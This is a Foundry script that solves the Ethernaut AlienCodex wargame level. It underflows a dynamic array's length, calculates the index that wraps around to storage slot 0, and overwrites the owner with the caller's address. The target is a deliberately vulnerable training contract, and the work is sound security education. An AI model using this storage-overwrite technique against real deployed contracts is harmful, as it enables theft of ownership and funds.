// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console2} from "forge-std/Script.sol";
import {IEthernaut} from "../interfaces/IEthernaut.sol";
import {AlienCodex} from "../src/Level19.sol";

contract Level19 is Script {
    IEthernaut ethernaut = IEthernaut(vm.envAddress("ETHERNAUT_ADDR"));
    address me = vm.addr(vm.envUint("PRIVATE_KEY"));

    function run() public {
        AlienCodex instance = AlienCodex(vm.envAddress("LVL19_ADDR"));
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        // Assuming the dynamic array starts at a slot location p,
        // then the slot p will contain the total number of
        // elements stored in the array, and the actual array data
        // will be stored at keccack256(p). More info on this can be
        // found in the Solidity Docs.

        // use underflow in the array to have an access to the all storage

        // 0	bool public contact and address private _owner (both are in slot 0)
        // 1	codex.length (Number of elements in the dynamic array

        //keccak256(1)	codex[0] (Array's first element)

        // the max : 2**256 - 1
        // -uint256(keccak256(abi.encode(uint256(1)))) because is space between both slot (the array and the owner)

        // 0	2**256 - 1 - uint256(keccak256(abi.encode(uint256(1)))) + 1 (slot 0 access)

        instance.makeContact();
        instance.retract();

        bytes32 newOwner = bytes32(uint256(uint160(me)));
        uint256 indexOfOwner = (2 ** 256 - 1) - uint256(keccak256(abi.encode(uint256(1)))) + 1;

        instance.revise(indexOfOwner, newOwner);

        ethernaut.submitLevelInstance(address(instance));

        vm.stopBroadcast();
    }
}
